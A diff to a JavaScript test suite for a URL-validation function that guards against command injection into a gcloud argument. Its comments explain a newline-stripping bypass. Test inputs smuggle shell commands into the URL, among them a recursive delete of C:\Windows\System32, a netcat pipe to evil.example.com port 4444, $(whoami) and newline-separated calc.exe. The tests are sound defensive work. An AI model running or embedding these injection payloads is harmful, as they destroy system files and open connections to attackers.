@@ -1274,7 +1274,7 @@ describe('validateAudience — origin + no-metachars contract', () => {
   test('rejects unparseable garbage', () => {
     assert.throws(
       () => validateAudience('not a url at all'),
-      /could not parse as URL/
+      /could not parse as URL|control characters or whitespace/
     );
   });
 
@@ -1317,14 +1317,14 @@ describe('validateAudience — origin + no-metachars contract', () => {
         validateAudience(
           'https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32'
         ),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
   test('rejects cmd.exe | (pipe)', () => {
     assert.throws(
       () => validateAudience('https://mcp.hafla.com|nc evil.example.com 4444'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
@@ -1332,42 +1332,108 @@ describe('validateAudience — origin + no-metachars contract', () => {
     // %USERPROFILE% would expand to the user's profile path under cmd.exe.
     assert.throws(
       () => validateAudience('https://mcp.hafla.com%USERPROFILE%'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
   test('rejects POSIX $(...) command substitution', () => {
     assert.throws(
       () => validateAudience('https://mcp.hafla.com$(whoami)'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
   test('rejects POSIX backtick command substitution', () => {
     assert.throws(
       () => validateAudience('https://mcp.hafla.com`whoami`'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
   test('rejects output redirection >', () => {
     assert.throws(
       () => validateAudience('https://mcp.hafla.com>out.txt'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
   test('rejects input redirection <', () => {
     assert.throws(
       () => validateAudience('https://mcp.hafla.com<input.txt'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
   });
 
   test('rejects cmd.exe ^ (escape)', () => {
     assert.throws(
       () => validateAudience('https://mcp.hafla.com^&malicious'),
-      /shell metacharacters|could not parse/
+      /shell metacharacters|could not parse|control characters or whitespace/
     );
+  });
+
+  // ── Control-character / whitespace gap (newline-injection class) ─────────
+  //
+  // The WHATWG URL parser silently strips ASCII tab / CR / LF from its input
+  // (per spec). The original 23e44ba shell-metachar blocklist did NOT
+  // include those, so a raw `GATEWAY_AUDIENCE` with an embedded `\n` would
+  // pass validation, get stripped during URL parsing, and — if the caller
+  // discarded the parser's normalized return value (which the module-load
+  // site originally did) — flow into execGcloud's `--audiences=<...>` arg
+  // with the newline still present. Under shell:true on Windows, cmd.exe
+  // interprets the newline as a command separator.
+  //
+  // The post-Gemini-review fix introduces an up-front C0-control/whitespace
+  // reject (constraint 1 in validateAudience), AND assigns the return value
+  // back to config.audience at the module-load call site. These tests pin
+  // both halves.
+
+  test('rejects embedded newline (\\n) — WHATWG-strip bypass class', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\ncalc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded carriage return (\\r)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\rcalc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded tab (\\t)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\tcalc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded NUL (\\0)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com\0calc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('rejects embedded space (0x20)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com calc.exe'),
+      /control characters or whitespace/
+    );
+  });
+
+  test('returns the parser-normalized origin (callers MUST assign back)', () => {
+    // Regression net for the "return value discarded" class. The module-load
+    // site MUST do `config.audience = validateAudience(config.audience)` so
+    // downstream callers use the parser-normalized origin. If a future
+    // refactor drops the assignment, the discarded-return-value class
+    // re-opens. We assert the function returns the parser's normalized
+    // origin — equality, not identity — and callers' assignment is the
+    // contractual obligation pinned in the JSDoc.
+    const result = validateAudience('https://mcp.hafla.com/');
+    assert.equal(result, 'https://mcp.hafla.com');
+    // The input had a trailing slash; the parser-normalized origin omits it.
+    // If the caller doesn't assign back, downstream sees the trailing slash.
+    assert.notEqual(result, 'https://mcp.hafla.com/');
   });
 });
